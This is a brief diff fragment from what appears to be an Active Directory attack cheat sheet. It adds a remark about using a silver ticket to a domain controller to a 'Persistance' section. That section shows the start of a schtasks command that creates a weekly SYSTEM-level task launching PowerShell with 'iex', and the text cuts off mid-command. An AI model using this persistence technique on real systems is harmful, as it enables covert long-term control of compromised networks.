@@ -231,7 +231,7 @@ Check TGT or TGS in memory of compromise machine
 
 # Persistance
   
-Via schedule task:
+Via schedule task (ex: when u get silver ticket to a dc):
   ```
    schtasks /create /S <COMPUTER> /SC
 Weekly /RU "NT Authority\SYSTEM" /TN myTask /TR "powershell.exe -c 'iex
